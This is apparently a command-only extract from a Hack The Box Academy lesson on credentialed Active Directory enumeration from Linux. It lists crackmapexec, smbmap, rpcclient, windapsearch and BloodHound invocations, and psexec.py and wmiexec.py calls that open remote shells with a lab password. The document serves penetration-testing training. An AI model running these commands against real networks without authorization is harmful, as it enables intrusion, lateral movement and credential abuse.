# Section 14: Credentialed Enumeration - from Linux

- Module: Active Directory Enumeration & Attacks (143)
- URL: https://academy.hackthebox.com/app/module/143/section/1269
- Code/command blocks: 19

> Terminal output is omitted; only commands & scripts are captured.

## 1. `shellsession` _(output omitted)_

```bash
crackmapexec -h
```

## 2. `shellsession` _(output omitted)_

```bash
crackmapexec smb -h
```

## 3. `shellsession` _(output omitted)_

```bash
sudo crackmapexec smb {{DC_IP}} -u {{USERNAME}} -p {{PASSWORD}} --users
```

## 4. `shellsession` _(output omitted)_

```bash
sudo crackmapexec smb {{DC_IP}} -u {{USERNAME}} -p {{PASSWORD}} --groups
```

## 5. `shellsession` _(output omitted)_

```bash
sudo crackmapexec smb 172.16.5.130 -u {{USERNAME}} -p {{PASSWORD}} --loggedon-users
```

## 6. `shellsession` _(output omitted)_

```bash
sudo crackmapexec smb {{DC_IP}} -u {{USERNAME}} -p {{PASSWORD}} --shares
```

## 7. `shellsession` _(output omitted)_

```bash
sudo crackmapexec smb {{DC_IP}} -u {{USERNAME}} -p {{PASSWORD}} -M spider_plus --share 'Department Shares'
```

## 8. `shellsession` _(output omitted)_

```bash
head -n 10 /tmp/cme_spider_plus/{{DC_IP}}.json 
```

## 9. `shellsession` _(output omitted)_

```bash
smbmap -u {{USERNAME}} -p {{PASSWORD}} -d {{DOMAIN_UPPER}} -H {{DC_IP}}
```

## 10. `shellsession` _(output omitted)_

```bash
smbmap -u {{USERNAME}} -p {{PASSWORD}} -d {{DOMAIN_UPPER}} -H {{DC_IP}} -R 'Department Shares' --dir-only
```

## 11. `bash`

```bash
rpcclient -U "" -N {{DC_IP}}
```

## 12. `bash`

```bash
psexec.py {{DOMAIN}}/wley:'transporter@4'@172.16.5.125
```

## 13. `bash`

```bash
wmiexec.py {{DOMAIN}}/wley:'transporter@4'@{{DC_IP}}
```

## 14. `shellsession` _(output omitted)_

```bash
windapsearch.py -h
```

## 15. `shellsession` _(output omitted)_

```bash
python3 windapsearch.py --dc-ip {{DC_IP}} -u {{USERNAME}}@{{DOMAIN}} -p {{PASSWORD}} --da
```

## 16. `shellsession` _(output omitted)_

```bash
python3 windapsearch.py --dc-ip {{DC_IP}} -u {{USERNAME}}@{{DOMAIN}} -p {{PASSWORD}} -PU
```

## 17. `shellsession` _(output omitted)_

```bash
bloodhound-python -h
```

## 18. `shellsession` _(output omitted)_

```bash
sudo bloodhound-python -u '{{USERNAME}}' -p '{{PASSWORD}}' -ns {{DC_IP}} -d {{DOMAIN}} -c all 
```

## 19. `shellsession` _(output omitted)_

```bash
ls
```

